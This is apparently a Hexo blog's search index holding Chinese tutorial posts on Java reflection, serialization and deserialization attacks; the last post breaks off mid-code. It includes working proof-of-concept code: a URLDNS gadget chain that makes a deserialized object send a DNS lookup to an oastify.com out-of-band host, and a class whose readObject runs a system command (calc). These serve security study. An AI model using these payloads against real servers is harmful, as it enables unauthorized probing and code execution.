<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>URLDNS链</title>
    <link href="/2023/10/20/2023-10-20-URLDNS%E9%93%BE/"/>
    <url>/2023/10/20/2023-10-20-URLDNS%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p>凌晨四点，我看见海棠花未眠。</p><h1 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h1><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>&emsp;&emsp;这是一条比较简单的利用链，本身不利用外部依赖，因此基本不受版本和环境的限制。但是这条利用链也只能做到发起DNS请求，因此常用于验证反序列化漏洞的存在与否。</p><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>&emsp;&emsp;在任意类中敲一个URL，按住ctrl单击，进入URL类，在URL类中可以找到hashCode方法，当hashCode的值为-1时，进入handler下的hashCode方法，我们按住ctrl单击进入该方法。</p><p><img src="/2023/10/20/2023-10-20-URLDNS%E9%93%BE/image.png" alt="Alt text"></p><p>&emsp;&emsp;在这个地方会通过getHostAddress发起DNS请求。</p><p><img src="/2023/10/20/2023-10-20-URLDNS%E9%93%BE/image-1.png" alt="Alt text"></p><p>&emsp;&emsp;但是需要注意的是，hashCode的默认初始值为-1</p><p><img src="/2023/10/20/2023-10-20-URLDNS%E9%93%BE/image-2.png" alt="Alt text"></p><p>&emsp;&emsp;再分析入口类hashmap，这个类重写了readObject方法，且参数类型宽泛，支持反序列化操作，是一个优秀的入口类。在readObject下的putVal中调用了hash方法，我们继续跟入hash方法。</p><p><img src="/2023/10/20/2023-10-20-URLDNS%E9%93%BE/image-3.png" alt="Alt text"></p><p>&emsp;&emsp;当key不为空时调用hashCode，完成整条链的利用。但是在这个地方存在着一个疑问，在我们代码执行逻辑中调用的是URL下的hashCode方法，可是当我们ctrl+单击时进入的时Object下的hashCode，希望能够碰到大佬进行解答。</p><p><img src="/2023/10/20/2023-10-20-URLDNS%E9%93%BE/image-4.png" alt="Alt text"></p><p>&emsp;&emsp;这时理论上我们只要创建一个HashMap，并且向其中传入一个url就可以完成代码。接下来编写代码进行实际测试。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://h4m6mmyf3qswqpzegyzic3i8rzxple.oastify.com&quot;</span>);<br>        HashMap&lt;Object, Object&gt; hashap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;Object, Object&gt;();<br>        hashap.put(url, <span class="hljs-number">333</span>);<br>        Serialize(hashap);<br>        <span class="hljs-comment">//unSerialize(new File(&quot;ser.bin&quot;));</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unSerialize</span><span class="hljs-params">(File filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;运行代码进行测试，将序列化和反序列化的过程分开，运行我们可以发现，实际情况下在序列化的过程中会直接发起请求，反序列化的过程中则不会发起请求，继续分析代码。（多次重复实验请注意更新DNS地址和删除ser.bin文件）</p><p><img src="/2023/10/20/2023-10-20-URLDNS%E9%93%BE/image-5.png" alt="Alt text"></p><p><img src="/2023/10/20/2023-10-20-URLDNS%E9%93%BE/image-6.png" alt="Alt text"></p><p>&emsp;&emsp;跟进hashmap.put我们会发现，当我们调用put的时候就已经调用hash方法发起DNS请求，因此在我们反序列化的过程中则不会再发起请求。因此我们需要在序列化的过程中避免发起请求，在前面我们已经知道可以通过hashCode的值来影响代码执行的流程，可是hashCode默认初始为-1，这就需要我们在上一节中提到的反射来进行修改，整个流程如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://dnslog&quot;</span>);<br>HashMap&lt;Object, Object&gt; hashap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;Object, Object&gt;();<br><span class="hljs-comment">//在这里，我们让hashCode的值不为-1，防止序列化发起DNS</span><br>hashap.put(url, <span class="hljs-number">333</span>);<br><span class="hljs-comment">//在这里再修改回-1，让反序列化发起DNS请求</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;重新修改代码逻辑。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://dnslog&quot;</span>);<br>        HashMap&lt;Object, Object&gt; hashap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;Object, Object&gt;();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clz</span> <span class="hljs-operator">=</span> URL.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashcode</span> <span class="hljs-operator">=</span> clz.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<span class="hljs-comment">//注意私有属性</span><br>        hashcode.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//在这里，我们让hashCode的值不为-1，防止序列化发起DNS</span><br>        hashcode.set(url, <span class="hljs-number">2</span>);<br>        hashap.put(url, <span class="hljs-number">333</span>);<br>        <span class="hljs-comment">//在这里再修改回-1，让反序列化发起DNS请求</span><br>        hashcode.set(url, -<span class="hljs-number">1</span>);<br>        Serialize(hashap);<br>        <span class="hljs-comment">//unSerialize(new File(&quot;ser.bin&quot;));</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unSerialize</span><span class="hljs-params">(File filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;再进行测试，就成功完成了URLDNS链的利用。</p><p><img src="/2023/10/20/2023-10-20-URLDNS%E9%93%BE/image-7.png" alt="Alt text"></p><p><img src="/2023/10/20/2023-10-20-URLDNS%E9%93%BE/image-8.png" alt="Alt text"></p><h3 id="利用链流程"><a href="#利用链流程" class="headerlink" title="利用链流程"></a>利用链流程</h3><p>&emsp;&emsp;这是URLDNS链的大致利用流程，至于后续的getByName不再继续跟入。</p><p><img src="/2023/10/20/2023-10-20-URLDNS%E9%93%BE/image-9.png" alt="Alt text"></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反射一</title>
    <link href="/2023/10/18/2023-10-18-java%E5%8F%8D%E5%B0%84/"/>
    <url>/2023/10/18/2023-10-18-java%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<p>有人说希斯莱杰演出了最棒的小丑,也有人说杰昆菲尼克斯的小丑演的最入神,实际上我们都知道,是你,我的朋友,当你出场的时候我们都被你戏剧性的表演逗笑了,你才是当之无愧的小丑。</p><h1 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h1><h3 id="什么是Java反射"><a href="#什么是Java反射" class="headerlink" title="什么是Java反射"></a>什么是Java反射</h3><p>&emsp;&emsp;反射是java语言的一个特性，它允程序在运行时（注意不是编译的时候）来进行自我检查并<br>且对内部的成员进行操作。反射是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法<br>,对于任意一个对象，都能够调用它的任意方法和属性,这种动态获取信息以及动态调用对象方法的功能称为<br>java语言的反射机制。</p><p>&emsp;&emsp;那么通过这样的说法直接来获取一个概念非常抽象，但是我们假如存在这样一个场景，存在着这样一个Person类，存在两个属性，一个public属性和一个private属性，并且已经定义了参数，我们需要在代码运行的过程中去修改这两个属性的参数，就可以通过反射的方法直接进行调用。</p><p>&emsp;&emsp;这里同时也提到在不同类中调用私有属性的一些方式：</p><p>&emsp;&emsp;1.在含私有属性的类中创建公有方法进行操作。</p><p>&emsp;&emsp;2.通过反射进行操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;小明&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">28</span>;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;直接通过实例化对象的方式。直接创建对象打印结果，且这种方法无法直接对私有属性进行调用，而反射则可以解决这一问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        System.out.println(person.getName());<br>        System.out.println(person.getAge());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/2023-10-18-java%E5%8F%8D%E5%B0%84/image.png" alt="Alt text"></p><p>&emsp;&emsp;这里体现了反射的用处，我们可以在没有setter方法的情况下对一个类中的属性进行操作，当然，反射也可以对类中的其他方法进行操作、解决一些类无法进行序列化反序列化等问题，这个在之后碰到了会进行实际补充。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        System.out.println(person.getName());<br>        System.out.println(person.getAge());<br><br>        System.out.println(<span class="hljs-string">&quot;************反射***************&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Person.class;<span class="hljs-comment">//反射创建一个类</span><br>        <span class="hljs-comment">//获取公有属性</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">namefield</span> <span class="hljs-operator">=</span> p.getField(<span class="hljs-string">&quot;name&quot;</span>);<br>        namefield.set(person, <span class="hljs-string">&quot;小红&quot;</span>);<br>        <span class="hljs-comment">//获取私有属性</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">agefiled</span> <span class="hljs-operator">=</span> p.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>        agefiled.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-comment">//激活私有属性</span><br>        agefiled.set(person, <span class="hljs-number">30</span>);<br><br>        System.out.println(person.getName());<br>        System.out.println(person.getAge());<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/2023-10-18-java%E5%8F%8D%E5%B0%84/image2.png" alt="Alt text"></p><h3 id="反射中的一些常见操作"><a href="#反射中的一些常见操作" class="headerlink" title="反射中的一些常见操作"></a>反射中的一些常见操作</h3><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">Class</span>&lt;?&gt; clazz = SomeClass.class<span class="hljs-punctuation">;</span><br><span class="hljs-comment">// 获取类名</span><br>String className = clazz.getName()<span class="hljs-punctuation">;</span><br><span class="hljs-comment">// 获取父类</span><br><span class="hljs-keyword">Class</span>&lt;?&gt; superClass = clazz.getSuperclass()<span class="hljs-punctuation">;</span><br><span class="hljs-comment">// 获取实现的接口</span><br><span class="hljs-keyword">Class</span>&lt;?&gt;[] interfaces = clazz.getInterfaces()<span class="hljs-punctuation">;</span><br><span class="hljs-comment">// 获取构造函数</span><br><span class="hljs-keyword">Constructor</span>&lt;?&gt;[] <span class="hljs-title function_">constructors</span> = <span class="hljs-title function_">clazz</span>.<span class="hljs-title function_">getConstructors</span><span class="hljs-params">()</span>;<br><span class="hljs-comment">// 获取方法</span><br><span class="hljs-keyword">Method</span>[] <span class="hljs-title function_">methods</span> = <span class="hljs-title function_">clazz</span>.<span class="hljs-title function_">getMethods</span><span class="hljs-params">()</span>;<br><span class="hljs-comment">// 获取字段</span><br>Field[] fields = clazz.getFields()<span class="hljs-punctuation">;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java反序列化基础二</title>
    <link href="/2023/10/18/2023-10-18-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/10/18/2023-10-18-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>不要总是羡慕别人的成功，如果大家都可以像哥哥一样坚持渗透测试两年半的话，那么大家都会成为优秀的红队了。</p><h1 id="Java反序列化漏洞"><a href="#Java反序列化漏洞" class="headerlink" title="Java反序列化漏洞"></a>Java反序列化漏洞</h1><h3 id="产生的原因"><a href="#产生的原因" class="headerlink" title="产生的原因"></a>产生的原因</h3><p>只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击者在服务器上运行代码的能力。</p><h3 id="可能的形式"><a href="#可能的形式" class="headerlink" title="可能的形式"></a>可能的形式</h3><p>1.入口类的readObject直接调用危险方法。（在实际情况中这种很难存在，因为已知readObject一定会被执行的情况下再加入危险方法，这样的程序员一般会被拉去枪毙。）</p><p>2.入口类参数中包含可控类，该类有危险方法，readObject时调用。</p><p>3.入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用。<br>比如类型定义为Object，调用equals&#x2F;hashcode&#x2F;toString</p><p>4.构造函数&#x2F;静态代码块等类加载时隐式执行。</p><h3 id="共同条件"><a href="#共同条件" class="headerlink" title="共同条件"></a>共同条件</h3><p>继承Serializable(保证可以被序列化与反序列化)</p><p>入口类&emsp;&emsp;[重写readObject(需要调用下一步的代码)&emsp;&emsp;参数类型宽泛(可以往里面任意传) &emsp;&emsp;最好jdk自带(可以通用)]&emsp;&emsp;例如：Map对象</p><p>调用链&emsp;&emsp;</p><p>执行类（rce SSRF 写文件）</p><h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3><p>我们以入口类的readObject直接调用危险方法为例来实现一次反序列化攻击的流程。</p><p>先自定义一个可以被反序列化的类，并且重写readObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        ois.defaultReadObject();<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后实例化并且将这个类序列化，保存在ser.bin文件中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializePerson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-number">22</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>读取ser.bin，反序列化，执行readObject，弹出计算器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">unSerializePerson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功执行<br><img src="/2023/10/18/2023-10-18-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image.png" alt="Alt text"></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java反序列化基础一</title>
    <link href="/2023/10/17/2023-10-17-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/10/17/2023-10-17-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>女神的拒绝千篇一律,兄弟的小丑各有千秋</p><h1 id="Java序列化与反序列化"><a href="#Java序列化与反序列化" class="headerlink" title="Java序列化与反序列化"></a>Java序列化与反序列化</h1><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>Java序列化就是指把Java对象转换为字节序列的过程，反序列化就是指把字节序列恢复为Java对象的过程。</p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>序列化最重要的作用：在传递和保存对象时.保证对象的完整性和可传递性。对象转换为有序字节流,以便在网络上传输或者保存在本地文件中。</p><p>反序列化的最重要的作用：根据字节流中保存的对象状态及描述信息，通过反序列化重建对象。</p><p>总结：核心作用就是对象状态的保存和重建。（整个过程核心点就是字节流中所保存的对象状态及描述信息）</p><h3 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h3><p>首先创建一个Person类，保证其继承Serializable使其可以被进行序列化反序列化操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>序列化的过程。通过ObjectOutputStream创建ser.bin文件，并且通过writeObject将序列化的字节流写入ser.bin。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">serializeTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span 